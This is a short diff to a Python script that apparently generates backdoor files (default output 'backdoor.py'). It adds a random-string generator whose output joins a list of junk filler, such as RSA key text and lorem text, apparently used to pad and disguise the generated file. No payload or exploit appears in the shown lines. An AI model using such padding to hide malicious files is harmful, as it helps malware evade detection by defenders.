@@ -29,6 +29,13 @@ import os
 import commands
 import time
 import random
+import string
+
+# random string generation
+
+numero = random.randint(1000,5000)
+def string_generator(size=(int(numero)), chars=string.ascii_uppercase + string.digits):
+	return ''.join(random.choice(chars) for _ in range(size))
 
 
 def fuzz():
@@ -38,6 +45,7 @@ def fuzz():
 
 
 pyjunk = str(fuzz())
+pyjunk2 = str(string_generator())
 
 error = '\033[37;41m'
 error1 = '\033[1;m'
@@ -277,7 +285,7 @@ NcPjjBvjld4EM+nuFCY6C62819jmD/jQ2FzA5hMiPne4tGb+JLO5cAg=
 '''
 
 """
-stringo = [rsa,rsa1,lorem,text,pyjunk]
+stringo = [rsa,rsa1,lorem,text,pyjunk,pyjunk2]
 _output_ = "backdoor.py" # edit this line is you want edit default output .
 _byte_ = (_output_) + "c" # bytecode format
 
